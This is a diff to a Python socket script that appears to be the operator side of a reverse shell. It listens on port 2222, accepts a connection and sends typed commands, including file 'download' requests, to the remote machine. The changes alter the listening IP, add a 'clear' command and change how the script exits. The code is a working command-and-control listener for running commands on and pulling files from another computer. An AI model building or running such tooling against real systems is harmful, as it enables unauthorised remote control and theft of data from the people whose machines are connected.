@@ -4,7 +4,7 @@ import sys
 
 sock = st.socket(st.AF_INET,st.SOCK_STREAM)
 sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
-sock.bind(('192.168.81.36',2222))
+sock.bind(('192.168.81.14',2222))
 sock.listen()
 con,addr = sock.accept()
 
@@ -18,6 +18,9 @@ try:
             cmd = input('>>>')
             if not cmd:
                 continue
+
+            elif cmd == 'clear':
+                system('clear')
 
             elif 'download' in cmd:
                 con.send(cmd.encode())
@@ -37,7 +40,7 @@ try:
             elif cmd in ('quite','exit'):
                 con.close()
                 sock.close()
-                break
+                sys.exit(1)
 
             else:
                 con.send(cmd.encode())
